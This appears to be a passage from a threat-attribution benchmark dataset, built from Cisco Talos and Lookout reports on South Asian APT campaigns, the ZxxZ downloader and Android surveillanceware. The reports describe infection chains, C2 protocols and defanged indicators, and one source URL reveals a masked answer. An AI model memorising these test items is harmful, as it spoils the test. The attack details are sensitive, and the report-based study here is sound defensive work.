CreateToolhelp32Snapshot and iterates through each process using API Process32First and Process32Next.      WinMain() snippet showing antivirus process detection.  The information-gathering function gathers the victim's hostname, operating system product name, and the victim's username and writes them into a memory buffer.      Information-gathering function.  The C2 communicating function at offset 401C50 is called from the two other requests making functions to send the victim's information with the decrypted strings  "xnb/dxagt5avbb2.php?txt=" and "data1.php?id=" to C2 and receive the response.    The received response is a remote file saved into the "debug" folder and executed with the API "ShellExecuteA". In our research debugging environment, the remote file is similar to the trojan.      Requests making function 1 at offset 00401E00.    Requests making function 2 at offset 00402130.  C2 communication  For C2 communication, first, the trojan sends the victim's computer name, user name, a separator "ZxxZ" and the Windows version pulled from the registry. The server responds back with data in the format  <id><user>:"<Program name">.    Next, the malware requests the program data. The server sends back the data of the Portable Executable effectively matching the pattern:<zero or more bytes>ZxxZ<PE data minus the MZ>. It then saves the file to  %LOCALAPPDATA%\Debug\<program name>.exe and tries to execute it.      Request sent to C2.  If the download is successful, the server sends back the request with the opcode DN-S and, in case of a failure, the opcode RN_E in their response. Based on our analysis, the opdoce DN-S means "download successful" and RN_E stands for run error. If failed, the malware attempts to download the program data 225 times, and after that, it will launch itself and exit.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Cisco Talos discovered an ongoing campaign operated by what we believe is the [PLACEHOLDER] APT group since August 2021. This campaign is a typical example of the actor targeting South Asian government entities.    This campaign targets an elite unit of the Bangladesh's government with a themed lure document alleging to relate to the regular operational tasks in the victim's organization. The lure document is a spear-phishing email sent to high-ranking officers of the Rapid Action Battalion Unit of the Bangladesh police (RAB). The emails contain either a malicious RTF document or a Microsoft Excel spreadsheet weaponized to exploit known vulnerabilities. Once the victim opens the maldoc, the Equation Editor application is automatically launched to run the embedded objects containing the shellcode to exploit known vulnerabilities described by CVE-2017-11882, CVE-2018-0798 and CVE-2018-0802 — all in Microsoft Office — then downloads the trojan from the hosting server and runs it on the victim's machine. The trojan masquerades as a Windows Security update service and allows the malicious actor to perform remote code execution, opening the door to other activities by installing other tools. In this campaign, the trojan runs itself but the actor has other RATs and downloaders in their arsenal.    Such surveillance campaigns could allow the threat actors to access the organization's confidential information and give their handlers an advantage over their competitors, regardless of whether they're state-sponsored.    [PLACEHOLDER] threat actor  [PLACEHOLDER] is a suspected South Asian threat actor. They have been active since 2013, targeting energy, engineering and government sectors in China, Pakistan and Saudi Arabia. In their latest campaign, they have extended their targeting to Bangladeshi government entities.    [PLACEHOLDER] is mainly motivated by espionage. The adversary typically downloads malware onto compromised endpoints from their hosting server via HTTP and uses DNS to establish contact with the command and control. [PLACEHOLDER]  is known for exploiting known vulnerabilities in victims' environments. For example, in 2021, security researchers discovered that the adversary was exploiting the zero-day vulnerability CVE-2021-28310, a security flaw in Microsoft's Desktop Manager. [PLACEHOLDER] is known to target both mobile and desktop platforms. Their arsenal mainly contains [PLACEHOLDER] RAT, Artra downloader, SlideRAT and AndroRAT.    Infrastructure  The actor's infrastructure consists of the C2 server (helpdesk[.]autodefragapp[.]com) and several domains that host the adversary's malware, which is outlined below.      Domains hosting [PLACEHOLDER] APT malware.  The SSL thumbprints are unique for each domain's certificate. We compiled a list of these SSL thumbprints in the IOCs section of the report. The timeline below shows the various domains based on their certificate creation date.      The C2 host is helpdesk[.]autodefragapp[.]com. Its WhoIs record indicates that the domain autodefragapp[.]com registered it in November 2020, and later updated it on Nov. 3, 2021. We have seen the actor use this C2 in previous campaigns.    The C2 domain resolved to 99[.]83[.]154[.]118 during the period of the campaign. This is a legitimate IP address for the AWS Global Accelerator networking service. Usually, the AWS Global Accelerator provides static IPs to the registrant, which allows the user to redirect traffic to their application or host for improved performance. In this case, we believe that the actor is using the AWS Global Accelerator to redirect traffic to their actual C2 host, which is parked behind the legitimate AWS service. We believe that the actor has employed this technique to conceal their identity.    Attribution  We assess with moderate confidence that this campaign is operated by [PLACEHOLDER] based on the use of the same C2 IP address from previous campaigns and similarities in the decrypted strings of the payload, such as module names, payload executable name, paths and the constants.      The 99[.]83[.]154[.]118 IP also hosts mswsceventlog[.]net, according to Cisco Umbrella, a domain that was previously reported as [PLACEHOLDER]'s C2 server in a campaign against Pakistani government organizations.    The campaign  Cisco Talos observed an ongoing campaign operated by the [PLACEHOLDER] APT group since August 2021 targeting Bangladeshi government personnel with spear-phishing emails. The email contains a maldoc attachment and masquerades as a legitimate email. The sender asks the target to review or verify the attached maldoc, which is either a call data record (CDR), a list of phone numbers, or a list of registered cases. We have seen the actor use these themes in phishing emails in the past.    The maldocs are an RTF document and Microsoft Excel spreadsheets. Examples of the specific subjects of the phishing emails are below.    Subject: CDR  Subject: Application for CDR  Subject: List of Numbers to be verified  Subject: List of registered cases  The maldocs' file names are consistent with the phishing emails' themes, as seen in the list of file names below:    Passport Fee Dues.xlsx  List of Numbers to be verified.xlsx  ASP AVIJIT DAS.doc  Addl SP Hafizur Rahman.doc  Addl SP Hafizur Rahman.xlsx  Registered Cases List.xlsx  Below are two spear-phishing email samples of this campaign.      Phishing email sample 1    Phishing email sample 2  The actor is using JavaMail with the Zimbra web client version 8.8.15_GA_4101 to send the emails. Zimbra is a collaborative software suite that includes an email server and a web client for messaging.      Phishing email header information.  The originating IP address and header information indicates the emails were sent from mail servers based in Pakistan and the actor spoofed the sender details to make the email appear as though it was sent from Pakistani government organizations. The actor exploited a possible vulnerability in the Zimbra mail server. By modifying the Zimbra mail server configuration file, a user can send emails from a non-existing email account/domain. We have compiled a list of fake sender email addresses from this campaign:    cdrrab13bd@gmail[.]com  arc@desto[.]gov[.]pk  so.dc@pc[.]gov[.]pk  mem_psd@pc[.]gov[.]pk  chief_pia@pc[.]gov[.]pk  rab3tikatuly@gmail[.]com  ddscm2@pof[.]gov[.]pk  The infection chain  The infection chain begins with the spear-phishing email and either a malicious RTF document or an Excel spreadsheet attachment. When the victim opens the attachment, it launches the Microsoft Equation Editor application to execute the equations in the form of OLE objects and connects to the hosting server to download and run the payload.      Malicious RTF infection chain summary.  In the case of a malicious Excel spreadsheet, when the victim opens the file, it launches the Microsoft Equation Editor application to execute the embedded equation object and launches the task scheduler to configure two scheduled tasks. One of the scheduled tasks downloads the trojan "ZxxZ" into the public user's account space, while the other task runs the "ZxxZ".      Malicious Excel infection chain summary.  The payload runs as a Windows security update service on the victim's machine and establishes communication with the C2 to remotely download and execute files in the victim's environment.    RTF document  The Malicious RTF document is weaponized to exploit the stack overflow vulnerability CVE-2017-11882, which enables arbitrary code execution on victims' machines running vulnerable versions of Microsoft Office. Our previous blog outlines how this particular exploit works in the victim's environment.      Malicious RTF document sample.  The RTF document is embedded with an OLE object with the class name "Equation 3.0." It contains the shellcode as an equation formula created using Microsoft Equation Editor.      Embedded Microsoft Equation object.  When the victim opens the RTF file with Microsoft Word, it invokes the Equation Editor application and executes the equation formula containing the Return-Oriented Programming (ROP) gadgets. The ROP loads and executes the shell code located at the end of the maldocs in an encrypted format that connects to the malicious host olmajhnservice[.]com and downloads the payload from the URL hxxp[:]//olmajhnservice[.]/nxl/nx. The payload is downloaded in the folder "C:\$Utf" created by the shellcode and runs as a process on the victim's machine.      Download URL captured during runtime of the maldoc.  Excel spreadsheet  The malicious Excel spreadsheet is weaponized to exploit the Microsoft Office memory corruption vulnerabilities CVE-2018-0798 and CVE-2018-0802.    When the victim opens the Excel spreadsheet, it launches the Microsoft Equation Editor application to execute the embedded Microsoft Equation 3.0 objects.      Malicious Excel spreadsheet.  Once the Microsoft Equation Editor service executes the embedded objects, it invokes the scheduled task service to configure the task scheduler with the commands shown below:    Task 1: Rdx      Task 2: RdxFac      The actor creates the folder "RdxFact '' in the Windows tasks folder and schedules two tasks with the task names "Rdx '' and "RdxFac '' to run every five minutes. When the first task runs, the victim's machine attempts to connect to the hosting server through the URL and, using the cURL utility, downloads the "RdxFactory.exe" into the public user profile's music folder. RdxFactory.exe is the trojan downloader.    After five minutes of execution of the first task, "Rdx,", the second task, "RdxFac,"runs to start the payload.    Based on other related samples we discovered, the actor also uses different folder names, tasks names and dropper file names in their campaigns.      We noticed that the actor is using the cURL command-line utility to download the payload in the Windows environment. Systems running Windows 10 and later have the cURL utility, which the actor abuses in this campaign.    The payload  The payload is a 32-bit Windows executable compiled in Visual C++ with a timestamp of Sept. 10, 2021. We named the trojan "ZxxZ" based on the name of a separator that the payload uses while sending information to the C2. This trojan is a downloader that downloads and executes the remote file. The executables were seen with the filenames "Update.exe", "ntfsc.exe" or "nx" in this campaign. They are either downloaded or dropped into the victim's "local application data" folder and run as a Windows Security update with medium integrity to elevate the privileges of a standard user.    The actor uses common encoding techniques to obfuscate strings in the WinMain function to hide its behavior from static analysis tools.      WinMain function snippet.  The decryption function receives the encrypted strings and decrypts each character with the XOR operation and stores the result in an array that will be returned to the caller function.      Decryption function.  The malware searches for the Windows Defender and Kaspersky antivirus processes in the victim's machine by creating the snapshot of running processes using CreateToolhelp32Snapshot and iterates through each process using API Process32First and Process32Next.      WinMain() snippet showing antivirus process detection.  The information-gathering function gathers the victim's hostname, operating system product name, and the victim's username and writes them into a memory buffer.      Information-gathering function.  The C2 communicating function at offset 401C50 is called from the two other requests making functions to send the victim's information with the decrypted strings  "xnb/dxagt5avbb2.php?txt=" and "data1.php?id=" to C2 and receive the response.    The received response is a remote file saved into the "debug" folder and executed with the API "ShellExecuteA". In our research debugging environment, the remote file is similar to the trojan.      Requests making function 1 at offset 00401E00.    Requests making function 2 at offset 00402130.  C2 communication  For C2 communication, first, the trojan sends the victim's computer name, user name, a separator "ZxxZ" and the Windows version pulled from the registry. The server responds back with data in the format  <id><user>:"<Program name">.    Next, the malware requests the program data. The server sends back the data of the Portable Executable effectively matching the pattern:<zero or more bytes>ZxxZ<PE data minus the MZ>. It then saves the file to  %LOCALAPPDATA%\Debug\<program name>.exe and tries to execute it.      Request sent to C2.  If the download is successful, the server sends back the request with the opcode DN-S and, in case of a failure, the opcode RN_E in their response. Based on our analysis, the opdoce DN-S means "download successful" and RN_E stands for run error. If failed, the malware attempts to download the program data 225 times, and after that, it will launch itself and exit.
https://www.lookout.com/threat-intelligence/article/lookout-discovers-novel-confucius-apt-android-spyware-linked-to-india-pakistan-conflict	The Lookout Threat Intelligence team has discovered two novel Android surveillanceware – Hornbill and SunBird. We believe with high confidence that these surveillance tools are used by the advanced persistent threat group (APT) [PLACEHOLDER], which first appeared in 2013 as a state-sponsored, pro-India actor primarily pursuing Pakistani and other South Asian targets.1 2    While primarily known for desktop malware, the [PLACEHOLDER] group was previously reported to have started leveraging mobile malware in 2017, with the Android surveillanceware ChatSpy.3 However, our discovery of SunBird and Hornbill shows that [PLACEHOLDER] may have been spying on mobile users up to a year before it started using ChatSpy.      Targets of these tools include personnel linked to Pakistan’s military, nuclear authorities, and Indian election officials in Kashmir. Hornbill and SunBird have sophisticated capabilities to exfiltrate SMS, encrypted messaging app content, and geolocation, among other types of sensitive information.              SunBird has been disguised as applications that include:    Security services, such as the fictional “Google Security Framework”  Apps tied to specific locations (“Kashmir News”) or activities (“Falconry Connect” and “Mania Soccer”)  Islam-related applications (“Quran Majeed”).  The majority of applications appear to target Muslim individuals.    Lookout named Hornbill after the Indian Grey Hornbill, which is the state bird of Chandigarh and where the developers of Hornbill are located. SunBird’s name was derived from the malicious services within the malware called “SunService” and the sunbird is also native to India.      Malicious functionality and impact of both SunBird and Hornbill  Hornbill and SunBird have both similarities and differences in the way they operate on an infected device. While SunBird features remote access trojan (RAT) functionality – a malware that can execute commands on an infected device as directed by an attacker – Hornbill is a discreet surveillance tool used to extract a selected set of data of interest to its operator.    Both of the malware can exfiltrate a wide range of data, such as:    Call logs  Contacts  Device metadata including phone number, IMEI/Android ID, Model and Manufacturer and Android version  Geolocation  Images stored on external storage  WhatsApp voice notes, if installed  Both malware are also able to perform the following actions on device:    Request device administrator privileges  Take screenshots, capturing whatever a victim is currently viewing on their device  Take photos with the device camera  Record environment and call audio  Scrape WhatsApp messages and contacts via accessibility services  Scrape WhatsApp notifications via accessibility services  ‍    SunBird-specific functionality  SunBird has a more extensive set of malicious capabilities than Hornbill. It attempts to upload all data it has access to at regular intervals to its command and control (C2) servers. Locally on the infected device, the data is collected in SQLite databases which are then compressed into ZIP files as they are uploaded to C2 infrastructure.    SunBird can exfiltrate the following list of data, in addition to the list above:    List of installed applications  Browser history  Calendar information  BlackBerry Messenger (BBM) audio files, documents and images  WhatsApp Audio files, documents, databases, voice notes and images  Content sent and received via IMO instant messaging application  In addition to the list of actions above, SunBird can also perform the following actions:    Download attacker specified content from FTP shares  Run arbitrary commands as root, if possible  Scrape BBM messages and contacts via accessibility services  Scrape BBM notifications via accessibility services  ‍      Samples of SunBird have been found hosted on third-party app stores, indicating one possible distribution mechanism. Considering many of these malware samples are trojanized – as in they contain complete user functionality – social engineering may also play a part in convincing targets to install the malware. No use of exploits was observed directly by Lookout researchers.  ‍    Hornbill-specific functionality  In contrast, Hornbill is more of a passive reconnaissance tool than SunBird. Not only does it target a limited set of data, the malware only uploads data when it initially runs and not at regular intervals like SunBird. After that, it only uploads changes in data to keep mobile data and battery usage low. The upload occurs when data monitored by Hornbill changes, such as when SMS, or WhatsApp notifications are received or calls are made from the device.    Hornbill is keenly interested in the state of an infected device and closely monitors the use of resources. For example, if the device is low on memory, it triggers the garbage collector. In addition to the list of exfiltrated data mentioned earlier, Hornbill also collects hardware information. For example, the malware can check if a device’s screen is locked, the amount of available internal and external storage and whether WiFi and GPS are enabled.    Hornbill only logs location information if it deems the changes to be significant enough from the previously recorded location – if the difference between the corresponding latitudes and longitudes differ by more than 0.0006 which is roughly 70 metres.    Data collected by Hornbill is stored in hidden folders on external storage. Once call recordings or audio recordings are uploaded to C2 infrastructure they are deleted from the device to avoid suspicion.    LOCATION ON EXTERNAL STORAGE TYPE OF DATA COLLECTED  /sdcard/.system0/.ia Audio (environment) recordings  /sdcard/.system0/.cr Call recordings  /sdcard/.system0/.tempo Temporary location used for testing upload to C2 infrastructure  /sdcard/.system0/.is/.iss Screenshots  /sdcard/.system0/.is/.ifcc Front camera “clicks” (photos)  /sdcard/.system0/.is/.ircc Rear camera “clicks” (photos)  ‍    Hornbill uses a unique set of server paths to communicate to C2 infrastructure. These are listed below along with what action Hornbill takes when sending HTTP POST requests to each.    UNIQUE SERVER PATHS ACTION  /SignUp Registers either a Device ID or User ID with a hardcoded password for further data exfiltration  /UploadFile Uploads file  /SaveMessages Bulk saves messages  /SaveCallLogs Bulk saves call logs  /SaveContactDetails Bulk saves contacts  /SaveGpsDetails Bulk saves GPS location  /UpdateMobileState Saves directory structure  /UpdateMobileState Queries C2 for queued and removed commands  ‍    The operators behind Hornbill are extremely interested in a user’s WhatsApp communications. In addition to exfiltrating message content and sender information of messages, Hornbill records WhatsApp calls by detecting an active call by abusing Android’s accessibility services. The exploitation of Android’s accessibility services in this manner is a trend we are observing frequently in Android surveillanceware. This enables the threat actor to avoid the need for privilege escalation on a device.    Lastly, Hornbill searches for and monitors activity on any documents stored on external storage with the following suffixes: ".doc", ".pdf", ".ppt", ".docx", ".xlsx", ".txt". Whenever a document is created, opened, closed, modified, moved or deleted, this action is logged by Hornbill. Functionality exists to modify this list of suffixes, but is incomplete in the samples we have observed. The latest samples of Hornbill show that this malware threat may still be under development.    ‍    Development timelines  The newest Hornbill sample was identified by Lookout’s app analysis engine as recently as December 2020, suggesting the malware may still be active today. Both ChatSpy and Hornbill’s packaging dates appeared to have been tampered with, but we first observed them in January 2018 and May 2018 respectively.    Lookout first observed SunBird in January 2017, but unlike the other two malware families, the packaging dates appear legitimate, indicating the malware was likely in development between December 2016 and early 2019.    ‍      Hornbill, which Lookout first saw in May 2018, is actively deployed. We observed new samples as recently as December 2020. The first SunBird sample was seen as early as 2017 and as late as December 2019.  ‍    Targeting  To better understand who SunBird may have been deployed against, we analyzed over 18GB of exfiltrated data that was publicly exposed from at least six insecurely configured C2 servers. All data uploaded to the C2 infrastructure included the locale of the infected devices. This information, combined with the data content, gave us extensive insight into who was being targeted by this malware family and the kind of information the attackers were after.    Some notable targets included an individual who applied for a position at the Pakistan Atomic Energy Commission, individuals with numerous contacts in the Pakistan Air Force (PAF), as well as officers responsible for electoral rolls (Booth Level Officers) located in the Pulwama district of Kashmir.    ‍      Based on the locale and country code information of infected devices and exfiltrated content, we think SunBird may have roots as a commercial Android surveillanceware. The data included information on victims in Europe and the United States, some of which appear to be targets of spouseware or stalkerware. It also included data on Pakistani nationals in Pakistan, India and the United Arab Emirates that we believe may be targeted by [PLACEHOLDER] APT campaigns between 2018 and 2019.  ‍    Malware development and commercial surveillance roots  Both Hornbill and SunBird appear to be evolved versions of commercial Android surveillance tooling. Hornbill seems to be derived from the same code base as a previously active commercial surveillanceware product known as MobileSpy. 5 It is unclear how the developers of Hornbill acquired the code, but the company behind MobileSpy, Retina-X Studios, shut down their surveillance software products in May 2018 after being hacked twice. 6 Links between the Hornbill developers indicate they all appear to have worked together at a number of Android and iOS app development companies registered and operating in or near Chandigarh, Punjab, India. In 2017, one developer claimed to be working at India’s Defence Research and Development Organisation (DRDO) on their LinkedIn profile.    SunBird looks to have been created by Indian developers who also produced another commercial spyware product, which we dubbed BuzzOut. 7 The theory that SunBird’s roots lay in stalkerware was also supported by the content found in the exfiltrated data we uncovered. The data included information on stalkerware victims, as well as Pakistani nationals living in Pakistan and traveling in the UAE and India. This data suggests that SunBird could have been sold to an actor that selectively deployed it to gather intelligence on targeted individuals. Similar behavior was observed with Stealth Mango and Tangelo, two nation state mobile surveillanceware Lookout researchers discovered in 2018. 8    ‍    Exfiltrated data  During this investigation, we were able to access exfiltrated data for SunBird whose C2 infrastructure had been insufficiently secured.    ‍      This is a breakdown of types of data SunBird exfiltrated. This data is from publicly-accessible exfiltrated content exposed on SunBird C2 servers for 5 campaigns between 2018 and 2019. We found another 12 GB of data exfiltrated on another C2 server 23.82.19[.]250. The default language of this server was set up as Chinese when discovered by Lookout researchers. This may be a false flag or may have been altered by a third party. This also makes it difficult to confirm if all of the data originated from infections of actual target devices.  ‍      Frequency of infected devices’ locale and country code settings (translated to languages and countries) as packaged within publicly-accessible exfiltrated data. This data includes both the [PLACEHOLDER] APT targets and spouseware victims of SunBird.  ‍      Left:One particular SunBird C2 server was found to also be exposing a log file containing IP addresses of those that logged into the administrator panel. The majority of these were distributed throughout India. Right: Geo-location data captured from a publicly-exposed database found on another Sunbird C2 IP 23.82.19[.]250. Almost all data stored on this server referenced phone numbers of various locations in northern India. The second most common region for phone numbers was Pakistan.  ‍    Within the exfiltrated data, one particular victim caught our interest. This individual was using WhatsApp to correspond with someone applying for a position at the Pakistan Nuclear Regulatory Authority in 2017. In 2018, messages were uncovered from someone applying for a position at the Pakistan Atomic Energy Commission.9    Additional exfiltrated data from late 2018 and early 2019 indicated that SunBird was being used to monitor Booth Level Officers10 responsible for field-level information regarding electoral rolls in the Pulwama district of Kashmir. This time and location is significant as Pulwama suffered a suicide bombing attack in February 2019, which increased tensions between India and Pakistan. The start date of active monitoring of this target on C2 servers coincided with the start of the Indian general elections held in April 2019.    ‍      Continuous data exfiltration data that occurred every ten minutes stopped at the end of 2018. Aside from one brief upload in January 2019, it suddenly picked up again on the 11th of April 2019. While this may be coincidence, this is also the same day that the Indian general elections of 2019 began.12  ‍    ‍    A total of 156 victims were discovered in this new dataset and included phone numbers from India, Pakistan and Kazakhstan.    ‍    [PLACEHOLDER] connection  ‍      Hornbill application icons impersonate various chat and system applications.  ‍    Similar to previous [PLACEHOLDER] tactics seen with ChatSpy, Hornbill samples often impersonate chat applications such as Fruit Chat, Cucu Chat and Kako Chat. The related C2 infrastructure communicates on port 8080, a pattern also seen on the desktop campaigns carried out by [PLACEHOLDER].14    The [PLACEHOLDER] group is well known for impersonating legitimate services to cover their tracks and confuse its victims. Naming malicious apps similar to legitimate ones may be an attempt to gain a target’s trust. For example, “kako chat” may have been named due to its similarity to KakaoTalk.15 However, Kako Chat’s C2 server (chatk.goldenbirdcoin[.]com) references a defunct cryptocurrency by the same name.16 Cucu Chat may refer to a seemingly benign dating app of the same name that is available on third-party app stores such as APKPure.17, 18 However, Cucu Chat communicates to the site http://wangu[.]xyz19 (also on port 8080) and itself appears to be an impersonation of Wangu, an application which advertises itself as a chat app for Zimbabweans.20 The latest sample of Hornbill titled “Filos” trojanizes the Mesibo21 Android application for legitimate chat functionality.    During our investigation, we noticed that Hornbill C2 infrastructure hosted HTML resources consistent with a commercial spyware page, but missing its image resources.    ‍      C2 servers for Hornbill were found to host HTML content from a commercial spyware.                    Additionally, Hornbill carries out data exfiltration via the following unique set of server paths:    ‍      ‍    We found that the patterns noted above also existed on another domain samaatv[.]online. Although Lookout has not directly observed an APK communicating to this domain, we think one likely exists. samaatv[.]online has resolved to the IP address 91.210.107[.]104 since May 2019, which encompasses the activity of this campaign.    In addition to this, we found the SunBird C2 domain pieupdate[.]online resolved to 91.210.107.111 in between February 2019 and July 2019. This is also the timeframe in which we observed active campaigns by SunBird on that infrastructure.    With the help of public reporting and Lookout’s dataset, we are confident that the [PLACEHOLDER] APT group is actively using the IPs between 91.210.107[.]103-91.210.107[.]112 to host a large portion of their infrastructure, both presently and in the past.    Additional open-source intelligence (OSINT) searches confirmed the above connections. We found a publicly-accessible 2018 Pakistani government advisory warning of a desktop malware campaign targeting officers and government staff. The campaign described in it used phishing emails that impersonated various government agencies to deliver malicious Microsoft Word exploits. The Indicators of Compromise (IOCs) for this campaign included domains that were known [PLACEHOLDER] infrastructure, leading us to believe the entire campaign could be attributed to that group.                         Official Report from Pakistan’s Federal Bureau of Revenue on Malicious Activity.  ‍    A particular point of interest on the advisory IoC list, and crucial in confirming [PLACEHOLDER] connections, was pieupdate[.]online, a C2 server for malicious desktop activity as well as SunBird mobile malware.    ‍      Hornbill malware has unique file paths with which to communicate with C2 servers. They also display a unique Spyware HTML page. Lookout researchers uncovered another domain, samaatv[.]online, which shares the same unique file paths and Spyware HTML page found on a Hornbill C2 server, cucuchat[.]com. It is tied to known [PLACEHOLDER] infrastructure by resolving to 91.210.107[.]104, in the [PLACEHOLDER] IP range.  ‍    We are confident SunBird and Hornbill are two tools used by the same actor, perhaps for different surveillance purposes.    To the best of our knowledge the apps described in this article were never distributed through Google Play. Users of Lookout security apps are protected from these threats.    Lookout Threat Advisory Services customers have already been notified with additional intelligence on this and other threats. Take a look at our Threat Advisory Services page to learn more.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: The Lookout Threat Intelligence team has discovered two novel Android surveillanceware – Hornbill and SunBird. We believe with high confidence that these surveillance tools are used by the advanced persistent threat group (APT) [PLACEHOLDER], which first appeared in 2013 as a state-sponsored, pro-India actor primarily pursuing Pakistani and other South Asian targets.1 2    While primarily known for desktop malware, the [PLACEHOLDER] group was previously reported to have started leveraging mobile malware in 2017, with the Android surveillanceware ChatSpy.3 However, our discovery of SunBird and Hornbill shows that [PLACEHOLDER] may have been spying on mobile users up to a year before it started using ChatSpy.      Targets of these tools include personnel linked to Pakistan’s military, nuclear authorities, and Indian election officials in Kashmir. Hornbill and SunBird have sophisticated capabilities to exfiltrate SMS, encrypted messaging app content, and geolocation, among other types of sensitive information.              SunBird has been disguised as applications that include:    Security services, such as the fictional “Google Security Framework”  Apps tied to specific locations (“Kashmir News”) or activities (“Falconry Connect” and “Mania Soccer”)  Islam-related applications (“Quran Majeed”).  The majority of applications appear to target Muslim individuals.    Lookout named Hornbill after the Indian Grey Hornbill, which is the state bird of Chandigarh and where the developers of Hornbill are located. SunBird’s name was derived from the malicious services within the malware called “SunService” and the sunbird is also native to India.      Malicious functionality and impact of both SunBird and Hornbill  Hornbill and SunBird have both similarities and differences in the way they operate on an infected device. While SunBird features remote access trojan (RAT) functionality – a malware that can execute commands on an infected device as directed by an attacker – Hornbill is a discreet surveillance tool used to extract a selected set of data of interest to its operator.    Both of the malware can exfiltrate a wide range of data, such as:    Call logs  Contacts  Device metadata including phone number, IMEI/Android ID, Model and Manufacturer and Android version  Geolocation  Images stored on external storage  WhatsApp voice notes, if installed  Both malware are also able to perform the following actions on device:    Request device administrator privileges  Take screenshots, capturing whatever a victim is currently viewing on their device  Take photos with the device camera  Record environment and call audio  Scrape WhatsApp messages and contacts via accessibility services  Scrape WhatsApp notifications via accessibility services  ‍    SunBird-specific functionality  SunBird has a more extensive set of malicious capabilities than Hornbill. It attempts to upload all data it has access to at regular intervals to its command and control (C2) servers. Locally on the infected device, the data is collected in SQLite databases which are then compressed into ZIP files as they are uploaded to C2 infrastructure.    SunBird can exfiltrate the following list of data, in addition to the list above:    List of installed applications  Browser history  Calendar information  BlackBerry Messenger (BBM) audio files, documents and images  WhatsApp Audio files, documents, databases, voice notes and images  Content sent and received via IMO instant messaging application  In addition to the list of actions above, SunBird can also perform the following actions:    Download attacker specified content from FTP shares  Run arbitrary commands as root, if possible  Scrape BBM messages and contacts via accessibility services  Scrape BBM notifications via accessibility services  ‍      Samples of SunBird have been found hosted on third-party app stores, indicating one possible distribution mechanism. Considering many of these malware samples are trojanized – as in they contain complete user functionality – social engineering may also play a part in convincing targets to install the malware. No use of exploits was observed directly by Lookout researchers.  ‍    Hornbill-specific functionality  In contrast, Hornbill is more of a passive reconnaissance tool than SunBird. Not only does it target a limited set of data, the malware only uploads data when it initially runs and not at regular intervals like SunBird. After that, it only uploads changes in data to keep mobile data and battery usage low. The upload occurs when data monitored by Hornbill changes, such as when SMS, or WhatsApp notifications are received or calls are made from the device.    Hornbill is keenly interested in the state of an infected device and closely monitors the use of resources. For example, if the device is low on memory, it triggers the garbage collector. In addition to the list of exfiltrated data mentioned earlier, Hornbill also collects hardware information. For example, the malware can check if a device’s screen is locked, the amount of available internal and external storage and whether WiFi and GPS are enabled.    Hornbill only logs location information if it deems the changes to be significant enough from the previously recorded location – if the difference between the corresponding latitudes and longitudes differ by more than 0.0006 which is roughly 70 metres.    Data collected by Hornbill is stored in hidden folders on external storage. Once call recordings or audio recordings are uploaded to C2 infrastructure they are deleted from the device to avoid suspicion.    LOCATION ON EXTERNAL STORAGE TYPE OF DATA COLLECTED  /sdcard/.system0/.ia Audio (environment) recordings  /sdcard/.system0/.cr Call recordings  /sdcard/.system0/.tempo Temporary location used for testing upload to C2 infrastructure  /sdcard/.system0/.is/.iss Screenshots  /sdcard/.system0/.is/.ifcc Front camera “clicks” (photos)  /sdcard/.system0/.is/.ircc Rear camera “clicks” (photos)  ‍    Hornbill uses a unique set of server paths to communicate to C2 infrastructure. These are listed below along with what action Hornbill takes when sending HTTP POST requests to each.    UNIQUE SERVER PATHS ACTION  /SignUp Registers either a Device ID or User ID with a hardcoded password for further data exfiltration  /UploadFile Uploads file  /SaveMessages Bulk saves messages  /SaveCallLogs Bulk saves call logs  /SaveContactDetails Bulk saves contacts  /SaveGpsDetails Bulk saves GPS location  /UpdateMobileState Saves directory structure  /UpdateMobileState Queries C2 for queued and removed commands  ‍    The operators behind Hornbill are extremely interested in a user’s WhatsApp communications. In addition to exfiltrating message content and sender information of messages, Hornbill records WhatsApp calls by detecting an active call by abusing Android’s accessibility services. The exploitation of Android’s accessibility services in this manner is a trend we are observing frequently in Android surveillanceware. This enables the threat actor to avoid the need for privilege escalation on a device.    Lastly, Hornbill searches for and monitors activity on any documents stored on external storage with the following suffixes: ".doc", ".pdf", ".ppt", ".docx", ".xlsx", ".txt". Whenever a document is created, opened, closed, modified, moved or deleted, this action is logged by Hornbill. Functionality exists to modify this list of suffixes, but is incomplete in the samples we have observed. The latest samples of Hornbill show that this malware threat may still be under development.    ‍    Development timelines  The newest Hornbill sample was identified by Lookout’s app analysis engine as recently as December 2020, suggesting the malware may still be active today. Both ChatSpy and Hornbill’s packaging dates appeared to have been tampered with, but we first observed them in January 2018 and May 2018 respectively.    Lookout first observed SunBird in January 2017, but unlike the other two malware families, the packaging dates appear legitimate, indicating the malware was likely in development between December 2016 and early 2019.    ‍      Hornbill, which Lookout first saw in May 2018, is actively deployed. We observed new samples as recently as December 2020. The first SunBird sample was seen as early as 2017 and as late as December 2019.  ‍    Targeting  To better understand who SunBird may have been deployed against, we analyzed over 18GB of exfiltrated data that was publicly exposed from at least six insecurely configured C2 servers. All data uploaded to the C2 infrastructure included the locale of the infected devices. This information, combined with the data content, gave us extensive insight into who was being targeted by this malware family and the kind of information the attackers were after.    Some notable targets included an individual who applied for a position at the Pakistan Atomic Energy Commission, individuals with numerous contacts in the Pakistan Air Force (PAF), as well as officers responsible for electoral rolls (Booth Level Officers) located in the Pulwama district of Kashmir.    ‍      Based on the locale and country code information of infected devices and exfiltrated content, we think SunBird may have roots as a commercial Android surveillanceware. The data included information on victims in Europe and the United States, some of which appear to be targets of spouseware or stalkerware. It also included data on Pakistani nationals in Pakistan, India and the United Arab Emirates that we believe may be targeted by [PLACEHOLDER] APT campaigns between 2018 and 2019.  ‍    Malware development and commercial surveillance roots  Both Hornbill and SunBird appear to be evolved versions of commercial Android surveillance tooling. Hornbill seems to be derived from the same code base as a previously active commercial surveillanceware product known as MobileSpy. 5 It is unclear how the developers of Hornbill acquired the code, but the company behind MobileSpy, Retina-X Studios, shut down their surveillance software products in May 2018 after being hacked twice. 6 Links between the Hornbill developers indicate they all appear to have worked together at a number of Android and iOS app development companies registered and operating in or near Chandigarh, Punjab, India. In 2017, one developer claimed to be working at India’s Defence Research and Development Organisation (DRDO) on their 